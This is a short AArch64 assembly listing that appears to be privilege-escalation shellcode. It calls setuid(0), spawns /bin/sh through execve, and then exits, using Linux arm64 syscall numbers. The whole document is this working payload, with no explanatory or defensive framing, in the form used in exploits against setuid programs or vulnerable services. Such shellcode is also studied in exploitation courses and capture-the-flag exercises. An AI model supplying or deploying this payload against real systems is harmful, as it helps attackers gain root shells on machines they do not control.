.text
.global main

main:
    // setuid(0)
    mov x0, #0
    mov x8, #146
    svc #0

    // execve("/bin/sh", NULL, NULL);
    adr x0, binsh
    mov x1, #0
    mov x2, #0
    mov x8, #221
    svc #0

    // exit(1)
    mov x0, #1
    mov x8, #93
    svc #0

binsh:
    .asciz "/bin/sh"
